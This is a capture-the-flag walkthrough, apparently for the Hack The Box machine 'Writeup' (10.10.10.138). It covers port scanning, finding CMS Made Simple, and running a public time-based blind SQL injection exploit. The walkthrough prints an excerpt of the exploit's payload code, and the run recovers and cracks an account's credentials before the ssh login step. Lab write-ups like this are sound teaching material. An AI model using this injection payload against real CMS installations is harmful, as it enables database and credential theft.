I"c:<h1 id="htb-writeup-101010138">HTB WriteUp (10.10.10.138)</h1>

<h3 id="table-of-contents">TABLE OF CONTENTS</h3>

<hr />

<h2 id="part-1--initial-recon">PART 1 : INITIAL RECON</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">--min-rate</span> 15000 <span class="nt">-p-</span> 10.10.10.138
<span class="go">
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  
</span><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> 10.10.10.138
<span class="go">
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
  | ssh-hostkey: 
  |   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
  |   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
  |_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
  80/tcp open  http    Apache httpd 2.4.25 ((Debian))
  | http-robots.txt: 1 disallowed entry 
  |_/writeup/
  |_http-title: Nothing here yet.
</span><span class="gp">  Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
</span></code></pre></div></div>
<p><strong>NOTE(S)</strong>:</p>
<ul>
  <li>There exists a <strong><code class="highlighter-rouge">robots.txt</code></strong> file.</li>
</ul>

<hr />

<h2 id="part-2--port-enumeration">PART 2 : PORT ENUMERATION</h2>

<h3 id="tcp-port-80">TCP PORT 80</h3>

<p><img src="./screenshots/31_writeup/80_landing_page.png" alt="Landing Page" /></p>

<p>There seems to be a script in place that monitors <strong>40X responses</strong> wchich serves as a DoS protection. This means that any form of bruteforce/dictionary attack to the http service might not work as expected.</p>

<p>There was a mention of a write-up page that is yet to go live but with the site having a DoS protection, running <strong><code class="highlighter-rouge">gobuster</code></strong> or <strong><code class="highlighter-rouge">wfuzz</code></strong> might not be the best option. Luckily, a <strong style="color:orange">robots.txt</strong> file was detected by the <strong><code class="highlighter-rouge">nmap</code></strong> scan earlier:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#              __
#      _(\    |@@|
#     (__/\__ \--/ __
#        \___|----|  |   __
#            \ }{ /\ )_ / _\
#            /\__/\ \__O (__
#           (--/\--)    \__/
#           _)(  )(_
#          `---''---`

# Disallow access to the blog until content is finished.
User-agent: * 
Disallow: /writeup/
</code></pre></div></div>

<p><strong style="color:orange">robots.txt</strong> tells web robots or web crawlers which pages of a site to crawl. This helps for a siteâ€™s SEO (Search Engine Optimization). In this case, the directory <strong><code class="highlighter-rouge">/writeup/</code></strong> was disallowed and therefore, should exist. This is probably the write-up page that was mentioned earlier.</p>

<p><img src="./screenshots/31_writeup/80_writeup_page.png" alt="/writeup/" /></p>

<table style="margin:auto; width:90%">
<tr>
<th colspan="2"><strong style="color:red">Wappalyzer</strong></th>
</tr>
<tr>
<td><strong style="color:orange">CMS</strong></td>
<td>CMS Made Simple</td>
</tr>
<tr>
<td><strong style="color:orange">Programming Language</strong></td>
<td>PHP</td>
</tr>
<tr>
<td><strong style="color:orange">Web Server</strong></td>
<td>Apache 2.4.25</td>
</tr>
<tr>
<td><strong style="color:orange">Operating System</strong></td>
<td>Debian</td>
</tr>
</table>

<p>The page just contains write-ups of the retired boxes, <strong>Ypuffy</strong> and <strong>Blue</strong>, but checking <strong style="color:orange">Wappalyzer</strong> that reveals the service running underneath is <strong style="color:orange">CMS Made Simple</strong></p>

<hr />

<h2 id="part-3--exploitation">PART 3 : EXPLOITATION</h2>

<p>There might already be an existing exploit for <strong style="color:orange">CMS Made Simple</strong>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>searchsploit CMS | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s2">"made simple"</span>
<span class="go">
  CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)       | exploits/php/remote/46627.rb
  CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                                  | exploits/php/webapps/26217.html
  CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                                  | exploits/php/webapps/26298.txt
  CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                               | exploits/php/webapps/29272.txt
  CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                   | exploits/php/webapps/29941.txt
  CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                  | exploits/php/webapps/32668.txt
  CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                        | exploits/php/webapps/43889.txt
  CMS Made Simple 1.2 - Remote Code Execution                                              | exploits/php/webapps/4442.txt
  CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                     | exploits/php/webapps/4810.txt
  CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                         | exploits/php/webapps/5600.php
  CMS Made Simple 1.4.1 - Local File Inclusion                                             | exploits/php/webapps/7285.txt
  CMS Made Simple 1.6.2 - Local File Disclosure                                            | exploits/php/webapps/9407.txt
  CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                      | exploits/php/webapps/33643.txt
  CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                         | exploits/php/webapps/11424.txt
  CMS Made Simple 1.7 - Cross-Site Request Forgery                                         | exploits/php/webapps/12009.html
  CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                            | exploits/php/webapps/34299.py
  CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                  | exploits/php/webapps/34068.html
  CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                         | exploits/php/webapps/41997.txt
  CMS Made Simple 2.1.6 - Remote Code Execution                                            | exploits/php/webapps/44192.txt
  CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                            | exploits/php/webapps/44976.py
  CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                            | exploits/php/webapps/45793.py
  CMS Made Simple &lt; 1.12.1 / &lt; 2.1.3 - Web Server Cache Poisoning                          | exploits/php/webapps/39760.txt
  CMS Made Simple &lt; 2.2.10 - SQL Injection                                                 | exploits/php/webapps/46635.py
  CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                         | exploits/php/webapps/34300.py
  CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                    | exploits/php/webapps/34298.py
  CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload           | exploits/php/webapps/46546.py

</span></code></pre></div></div>

<p>The latest unauthenticated standalone exploit available is <strong><code class="highlighter-rouge">SQL Injection</code></strong> for versions <strong><code class="highlighter-rouge">CMS Made Simple &lt; 2.2.10</code></strong>.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>searchsploit <span class="nt">-m</span> exploits/php/webapps/46635.py
<span class="go">  
    Exploit: CMS Made Simple &lt; 2.2.10 - SQL Injection
        URL: https://www.exploit-db.com/exploits/46635
       Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
  File Type: Python script, ASCII text executable, with CRLF line terminators

</span></code></pre></div></div>

<p>The exploit calls the functions, <strong><code class="highlighter-rouge">dump_salt()</code></strong>, <strong><code class="highlighter-rouge">dump_username()</code></strong>, <strong><code class="highlighter-rouge">dump_email()</code></strong>, and <strong><code class="highlighter-rouge">dump_password()</code></strong> to extract user credentials in the database. It is done by performing a <strong style="color:red">time-based blind SQL injection</strong> where if the query returned is not null, the system sleeps for some time.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">...</span><span class="n">omitted</span><span class="o">...</span>
<span class="k">def</span> <span class="nf">dump_password</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">flag</span>
    <span class="k">global</span> <span class="n">password</span>
    <span class="k">global</span> <span class="n">output</span>
    <span class="n">ord_password</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">ord_password_temp</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">while</span> <span class="n">flag</span><span class="p">:</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="bp">False</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">dictionary</span><span class="p">)):</span>
            <span class="n">temp_password</span> <span class="o">=</span> <span class="n">password</span> <span class="o">+</span> <span class="n">dictionary</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
            <span class="n">ord_password_temp</span> <span class="o">=</span> <span class="n">ord_password</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">dictionary</span><span class="p">[</span><span class="n">i</span><span class="p">]))[</span><span class="mi">2</span><span class="p">:]</span>
            <span class="n">beautify_print_try</span><span class="p">(</span><span class="n">temp_password</span><span class="p">)</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="s">"a,b,1,5))+and+(select+sleep("</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">TIME</span><span class="p">)</span> <span class="o">+</span> <span class="s">")+from+cms_users"</span>
            <span class="n">payload</span> <span class="o">+=</span> <span class="s">"+where+password+like+0x"</span> <span class="o">+</span> <span class="n">ord_password_temp</span> <span class="o">+</span> <span class="s">"25+and+user_id+like+0x31)+--+"</span>
            <span class="n">url</span> <span class="o">=</span> <span class="n">url_vuln</span> <span class="o">+</span> <span class="s">"&amp;m1_idlist="</span> <span class="o">+</span> <span class="n">payload</span>
            <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
            <span class="n">elapsed_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span>
            <span class="k">if</span> <span class="n">elapsed_time</span> <span class="o">&gt;=</span> <span class="n">TIME</span><span class="p">:</span>
                <span class="n">flag</span> <span class="o">=</span> <span class="bp">True</span>
                <span class="k">break</span>
        <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
            <span class="n">password</span> <span class="o">=</span> <span class="n">temp_password</span>
            <span class="n">ord_password</span> <span class="o">=</span> <span class="n">ord_password_temp</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="n">output</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\n</span><span class="s">[+] Password found: '</span> <span class="o">+</span> <span class="n">password</span>
<span class="o">...</span><span class="n">omitted</span><span class="o">...</span>
</code></pre></div></div>

<p>The data are extracted by querying if a string (starting from the first character of the actual string) is a substring of the actual string. This is checked by measuring the response times. If it is greater than or equal to the sleep time, then the query did not return a null value. This is done character by character until the entire character string is returned.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python ./46635.py <span class="nt">--url</span> http://10.10.10.138/writeup/ <span class="nt">--wordlist</span> /usr/share/wordlists/rockyou.txt <span class="nt">--crack</span>
<span class="go">
  [+] Salt for password found: 5a599ef579066807
  [+] Username found: jkr
  [+] Email found: jkr@writeup.htb
  [+] Password found: 62def4866937f08cc13bab43bb14e6f7
  [+] Password cracked: raykayjay9

</span></code></pre></div></div>

<p>The exploit takes a while to run since it is more of a bruteforcing method coupled with the <strong><code class="highlighter-rouge">sleep()</code></strong> function but at least, it worked. It revealed a credential pair for the user, <strong><code class="highlighter-rouge">jkr</code></strong>.</p>

<hr />

<h2 id="part-4--generate-a-user-shell">PART 4 : GENERATE A USER SHELL</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-l</span> jkr 10.10.10.138
<span class="go">
  
</span></code></pre></div></div>

:ET